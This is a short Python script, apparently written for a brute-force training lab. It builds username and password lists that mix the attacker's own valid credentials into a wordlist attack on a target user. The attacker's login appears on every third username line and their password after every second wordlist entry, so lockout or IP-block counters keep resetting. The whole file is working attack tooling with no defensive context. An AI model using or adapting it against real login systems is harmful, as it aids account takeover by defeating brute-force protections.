#!/usr/bin/env python3

import argparse
from pathlib import Path

parser = argparse.ArgumentParser()
parser.add_argument("-y", "--your_user", type=str, required=True, help="User you have creds for")
parser.add_argument("-t", "--target_user", type=str, required=True, help="Target user")
parser.add_argument("-r", "--range", type=int, default=100, help="This should be equal to len of original passlist")
parser.add_argument("-m", "--pass_mode", action="store_true", help="Generate a password list with similar logic")
parser.add_argument("-p", "--password", type=str, required=False, help="The password for your account")
parser.add_argument("-l", "--list", required=False, help="Password list to modify")
args = parser.parse_args()

userlist = ""

for u in range(0, args.range):
    if (u + 1) % 3 ==0:
        userlist += args.your_user + '\n'
    else:
        userlist += args.target_user + '\n'

file_path = Path('new_users.txt')
file_path.write_text(userlist)

if args.pass_mode:
    passlist = Path(args.list)

    with passlist.open('r') as file:
        lines = file.readlines()
    
    modded_list = ""
    for p, line in enumerate(lines, start=1):
        modded_list += line
        if p % 2 == 0:
            modded_list += args.password + '\n'
    
    plist = Path('new_passwords.txt')
    plist.write_text(modded_list)
